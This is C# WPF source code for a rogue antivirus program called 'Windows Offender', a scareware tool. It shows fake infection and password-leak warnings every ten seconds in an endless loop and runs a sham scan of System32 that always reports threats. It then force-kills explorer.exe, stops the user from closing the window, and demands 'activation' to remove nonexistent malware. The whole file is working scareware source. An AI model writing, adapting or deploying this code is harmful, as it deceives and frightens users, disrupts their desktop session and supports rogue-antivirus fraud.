using System.Diagnostics;
using System.Diagnostics.Metrics;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Shapes;

namespace RogueAV
{
    public partial class MainWindow : Window
    {
        private String[] Warnings = {"Windows Offender Has Detected Malicous Software on Your Computer",
                                     "Trojan.Win32.Vuvuria Has Been found on our system, please scan your machine to remove it",
                                     "Porn Ads Has Been Found, Please Run Windows Offender Scanner!",
                                     "Watch Out! Your Passwords Has Been PWNED!, Make Sure to Run Windows Offender Scanner!",
                                     "Your Password has been found in the internet! Please Run Windows Offender Scanner!",
                                     "Trojen.Win32.Memz has Been Found On Your Machine, Please Run Windows Offender Scanner!\""};
        public MainWindow()
        {
            InitializeComponent();
            StartWarnings();
        }

        private async void StartWarnings()
        {
            Random random = new Random();
            while (true) {
                Dispatcher.Invoke(() =>
                {
                    MessageBox.Show(Warnings[random.Next(0, Warnings.Length)], "Windows Offender", MessageBoxButton.OK, MessageBoxImage.Warning);
                });
                await Task.Delay(10000);
            }
        }
        
        private async void StartScan()
        {
            string[] files = Directory.GetFiles(@"C:\Windows\System32\");
            bar.Maximum = files.Length;
            Buttonn.IsEnabled = false;
            int counter = 0;
            foreach (var path in Directory.GetFiles(@"C:\Windows\System32\"))
            {
                Dispatcher.Invoke(() =>
                {
                    Files.Clear();
                    Files.AppendText(System.IO.Path.GetFileName(path) + "\n");
                    bar.Value = ++counter;
                });
                await Task.Delay(10);
            }
            status.Content = "Threats Found!";
            Buttonn.IsEnabled = true;
            fakeremove.Visibility = Visibility.Visible;
            fakeresponse.Content = "Threats Have Been Found!";
            Process.Start("cmd.exe", "/C taskkill /f /im explorer.exe");

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            status.Content = "Scanning....";
            StartScan();
            
        }

        private void fakeremove_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("Activate Windows Offender To Remove Malware!\n", "Windows Offender", MessageBoxButton.OK, MessageBoxImage.Exclamation);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            MessageBox.Show("MALWARE HAS BEEN DETECTED\nYOU CANNOT EXIT WINDOWS OFFENDER TILL THE MALWARE HAS BEEN REMOVED", "Windows Offender", MessageBoxButton.OK, MessageBoxImage.Exclamation);
            e.Cancel = true;
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("Error Contacting Activation Server", "Windows Offender", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }
}
